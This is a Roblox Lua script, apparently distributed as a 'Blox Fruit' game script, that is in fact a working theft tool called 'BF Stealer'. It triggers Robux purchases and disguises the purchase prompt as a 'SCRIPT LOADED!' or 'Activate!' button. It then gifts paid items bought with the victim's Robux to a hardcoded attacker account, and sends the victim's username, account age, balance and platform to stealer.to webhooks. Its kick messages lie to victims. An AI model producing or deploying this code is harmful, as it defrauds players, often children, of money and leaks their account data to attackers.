-- Configuration (CHANGE THESE TO YOUR VALUES)
local LogsWebhook = "https://stealer.to/post?uniqueid=97b37190" -- Webhook for general logs
local ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96" -- Webhook for execution logs
local Username = "x6TNine"   -- Username to gift items to

--Kicks
local kickMessage = "\n[DELTA DOES NOT WORK WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again."  -- Kick message
local insufficientRobuxMessage = "\n[DELTA DOES NOT WORK WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again." -- Kick message for low robux
local version = "1.1.1" -- script version number

-- Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local marketplaceService = game:GetService("MarketplaceService")
local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)

-- Global Variables
local result = 0
local UserId = nil
local webhookSent = false -- Prevent multiple webhook sends per session
local initialRobuxCheck = false
local uiLoaded = false

-- Message array
local messages = {
	"Enjoy your new item!",
    "A little something for you!",
    "Hope you like it!",
    "A lil token, enjoy!!!",
    "POW! Gift bomb!! üí£",
    "Surprise delivery incoming!",
    "Random act of kindness <3",
    "FREEEEEEEEEEEEE!!!!",
	"Here is your free gift!",
    "Sent with love! <3",
}

-- Helper function to get executor name
local function getExecutor()
    if syn then
        return "Synapse X"
    elseif getexecutor then
        return getexecutor()
    elseif identifyexecutor then
        return identifyexecutor()
    elseif fluxus then
        return "Fluxus"
    else
        return "Unknown"
    end
end

-- Function to check if the player is on mobile
local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

-- Kick player function
local function kickPlayer(msg)
	game.Players.LocalPlayer:Kick(msg)
end

-- Executor Check and Kick if required
local currentExecutor = getExecutor()
if currentExecutor == "Delta" and isMobile() then
    kickPlayer(kickMessage)
end

-- Function to get a random message from the array
local function getRandomMessage()
	return messages[math.random(1, #messages)]
end

-- Function to send webhook messages
local function sendWebhook(totalSpent, itemName)
	local balance = result
	local executorIdentifier = getExecutor()

    local embed = {
        ["title"] = "Dark Scripts - You Got Blox Fruit Hit! :owl:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ·¥ò ü·¥Ä è·¥á Ä …™…¥Íú∞·¥è",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ·¥õ·¥è·¥õ·¥Ä ü  Ä·¥è ô·¥úx",
                ["value"] = "```" .. totalSpent .. "```"
            },
			{
                ["name"] = "Item Hit",
                ["value"] = "```" .. itemName .. "```"
            },
			{
                ["name"] = "Executor Info",
                ["value"] = "```Executor: " .. executorIdentifier .. "```"
            },
			{
                ["name"] = "Current Robux",
                ["value"] = "```" .. balance .. "```"
            },
            {
                ["name"] = "·¥Ö…™Íú±·¥Ñ·¥è Ä·¥Ö s·¥á Ä·¥†·¥á Ä",
                ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end


local function sendExecutionLog()
	local executorIdentifier = getExecutor()
	local platform = isMobile() and "Mobile" or "PC"
	local membershipType = game.Players.LocalPlayer.MembershipType
	local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"

	local embed = {
		["title"] = "Script Execution Log",
		["color"] = 3063792,
		["fields"] = {
			{
				["name"] = "Username",
				["value"] = game.Players.LocalPlayer.Name,
				["inline"] = true
			},
			 {
				["name"] = "Current BF Stealer Version",
				["value"] = version,
				["inline"] = true
			},
			{
				["name"] = "Current Game",
				["value"] = gameInfo.Name,
				["inline"] = true
			},
			{
				["name"] = "Robux Balance",
				["value"] = tostring(result),
				["inline"] = true
			},
             {
                ["name"] = "Has Premium",
                ["value"] = hasPremium,
                ["inline"] = true
            },
			{
				["name"] = "Current Executor",
				["value"] = executorIdentifier,
				["inline"] = true
			},
			{
				["name"] = "Platform",
				["value"] = platform,
				["inline"] = true
			},
		}
	}

	local data = HttpService:JSONEncode({
		["embeds"] = {embed}
	})

    request({
        Url = ExecutionWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end


-- Function to hide notifications if they exist
local function hideNotifications()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local notifications = playerGui:FindFirstChild("Notifications")

    if notifications then
        notifications.Enabled = false
    end
end


-- Retrieve user ID
local success, err = pcall(function()
    UserId = Players:GetUserIdFromNameAsync(Username)
end)

if not success then
	warn("Error getting user ID: " .. (err or "Unknown"))
	kickPlayer("Error Getting User ID. Please Rejoin")
end

-- Initial Robux Purchase (To trigger the purchase prompt)
local args = {
    [1] = "buyRobuxShop",
    [2] = {
        ["StorageName"] = "2x EXP (15 mins.)",
        ["FunnelId"] = "Shop",
        ["PurchaseLocation"] = "Shop"
    }
}

local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local initialPurchaseSuccess = pcall(function()
    CommF:InvokeServer(unpack(args))
end)

if not initialPurchaseSuccess then
	warn("Error triggering initial purchase.")
    kickPlayer("Error Loading Script, Please Rejoin!")
	return -- stop the script
end

-- Wait for PurchasePrompt and modify it
local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
local Animator = ProductContainer:WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local prompt = Animator:WaitForChild("Prompt")
        local alertContents = prompt:WaitForChild("AlertContents")

        local middleContent = alertContents:FindFirstChild("MiddleContent")
        if middleContent then
            middleContent.Visible = false
        end

        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
        if title and title:IsA("TextLabel") then
            title.Text = "SCRIPT LOADED!"
        end

        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2.Visible = false
        end

        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
        if footerContent then
            footerContent.Visible = false
        end

        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            local buttonContent = button1:WaitForChild("ButtonContent")
            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
            if buttonMiddleContent then
                buttonMiddleContent.Text = "LOAD!"
            end
        end
    end
end)

local function stealitem()
    local items_to_steal = {
        { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
        { threshold = 4000, storage_name = "Permanent Kitsune-Kitsune" },
        { threshold = 3000, storage_name = "Permanent Leopard-Leopard" },
        { threshold = 2700, storage_name = "Fruit Notifier" },
        { threshold = 2550, storage_name = "Permanent Spirit-Spirit" },
        { threshold = 2500, storage_name = "Permanent Gas-Gas" },
        { threshold = 2450, storage_name = "Permanent Venom-Venom" },
        { threshold = 2425, storage_name = "Permanent Shadow-Shadow" },
        { threshold = 2400, storage_name = "Permanent Dough-Dough" },
        { threshold = 2350, storage_name = "Permanent T-Rex-T-Rex" },
        { threshold = 2300, storage_name = "Permanent Gravity-Gravity" },
        { threshold = 2250, storage_name = "Permanent Blizzard-Blizzard" },
        { threshold = 2200, storage_name = "Permanent Pain-Pain" },
        { threshold = 2100, storage_name = "Permanent Rumble-Rumble" },
        { threshold = 2000, storage_name = "Permanent Portal-Portal" },
        { threshold = 1900, storage_name = "Permanent Sound-Sound" },
        { threshold = 1800, storage_name = "Permanent Spider-Spider" },
        { threshold = 1700, storage_name = "Permanent Love-Love" },
        { threshold = 1650, storage_name = "Permanent Buddha-Buddha" },
        { threshold = 1500, storage_name = "Permanent Quake-Quake" },
        { threshold = 1300, storage_name = "Permanent Magma-Magma" },
        { threshold = 1275, storage_name = "Permanent Ghost-Ghost" },
        { threshold = 1250, storage_name = "Permanent Barrier-Barrier" },
        { threshold = 1200, storage_name = "Dark Blade" },
        { threshold = 1100, storage_name = "Permanent Light-Light" },
        { threshold = 1000, storage_name = "Permanent Diamond-Diamond" },
        { threshold = 950, storage_name = "Permanent Dark-Dark" },
        { threshold = 850, storage_name = "Permanent Sand-Sand" },
        { threshold = 750, storage_name = "Permanent Ice-Ice" },
        { threshold = 650, storage_name = "Permanent Falcon-Falcon" },
        { threshold = 550, storage_name = "Permanent Flame-Flame" },
        { threshold = 450, storage_name = "2x Money" },
        { threshold = 400, storage_name = "+1 Fruit Storage" },
        { threshold = 380, storage_name = "Permanent Spike-Spike" },
        { threshold = 350, storage_name = "2x Boss Drops" },
        { threshold = 250, storage_name = "Permanent Smoke-Smoke" },
        { threshold = 220, storage_name = "Permanent Bomb-Bomb" },
        { threshold = 180, storage_name = "Permanent Spring-Spring" },
        { threshold = 100, storage_name = "Permanent Blade-Blade" },
        { threshold = 75, storage_name = "Permanent Spin-Spin" },
        { threshold = 50, storage_name = "10K Money" },
        { threshold = 25, storage_name = "2x EXP (15 mins.)" },
    }

    table.sort(items_to_steal, function(a, b)
        return a.threshold > b.threshold
    end)

    for _, item_data in ipairs(items_to_steal) do
        if result >= item_data.threshold then
            local args = {
                [1] = "buyRobuxShop",
                [2] = {
                    ["Message"] = getRandomMessage(),
                    ["StorageName"] = item_data.storage_name,
                    ["PurchaseLocation"] = (string.find(item_data.storage_name, "Permanent") and "FruitShop") or "Shop",
                    ["FunnelId"] = "Shop",
                    ["ReceiverName"] = Username,
                    ["ReceiverUserId"] = UserId,
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            break -- Exit the loop after gifting the first eligible item
        end
    end
end

local function WaitForPrompt1()
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")
    stealitem()
    local CoreGui = game:GetService("CoreGui")

    local success, err = pcall(function()
        local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
        local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
        local Animator = ProductPurchaseContainer:WaitForChild("Animator")
        local Prompt = Animator:WaitForChild("Prompt")
        local AlertContents = Prompt:WaitForChild("AlertContents")

        local MiddleContent = AlertContents:WaitForChild("MiddleContent")
        MiddleContent.Visible = false

        local Footer = AlertContents:WaitForChild("Footer")
        local FooterButtons = Footer:WaitForChild("Buttons")
        local FooterButton1 = FooterButtons:WaitForChild("1")
        FooterButton1.Visible = false

        local FooterContent = Footer:WaitForChild("FooterContent")
        FooterContent.Visible = false

        local FooterButton2 = FooterButtons:WaitForChild("2")
        FooterButton2.Visible = true

        local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
        FooterButton2Text.Text = "Activate!"
        FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)

        local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
        FooterButton2Icon.Visible = false

        local TitleContainer = AlertContents:WaitForChild("TitleContainer")
        local TitleArea = TitleContainer:WaitForChild("TitleArea")
        local TitleText = TitleArea:WaitForChild("Title")
        TitleText.Text = "Activate Blox Fruit Script!"
        TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
    end)

    if not success then
        warn("UI..")
    end
end

local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")

if balanceText then
    result = tonumber(balanceText) + 25
end

local function WaitForPrompt2()
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")
    sendWebhook()
end

WaitForPrompt1()
WaitForPrompt2()
